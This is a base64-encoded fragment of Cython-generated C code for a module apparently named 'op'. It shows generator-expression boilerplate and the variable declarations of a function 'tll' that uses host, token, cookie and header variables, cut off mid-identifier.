Q2xlYXIoKTtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF81ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApO1xuICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICB9XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAjZW5kaWZcbiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTtcbiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF8zdGxsXzZnZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7XG4gIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkge1xuICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKVB5X05vbmUpO1xuICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgICBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wO1xuICBfX1B5eF9JTkNSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBfX1B5eF9HZW5lcmF0b3JfTmV3KChfX3B5eF9jb3JvdXRpbmVfYm9keV90KSBfX3B5eF9nYl8yb3BfM3RsbF84Z2VuZXJhdG9yMiwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcCk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKSB9XG4gIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHtcbiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpO1xuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF81ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApO1xuICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICB9XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAjZW5kaWZcbiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTtcbiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yb3BfMnRsbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X24xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfbjIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9ob3N0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaGUzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3RvayA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9oZWFkZXJzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9mID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3RsbF8yZ2VuZXJhdG9yID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJvcF8zdGxsXzVnZW5lcmF0b3IxID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJvcF8zdGxsXzhnZW5lcmF0b3IyID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzk7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTFbMTFdO1xuICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTdbNF07XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE4ID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMTk7XG4gIGludCBfX3B5eF90XzIwO1xuICBpbnQgX19weXhfdF8yMTtcbiAgaW50IF9fcHl4X3RfMjI7XG4gIGNoYXIgY29uc3QgKl9fcHl4X3RfMjM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzI0ID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidGxsIiwgMCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBOVUxMO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcmFuZ2UpO1xuICAgICAgX19weXhfdF82ID0gX19weXhfYnVpbHRpbl9yYW5nZTsgXG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2Jhb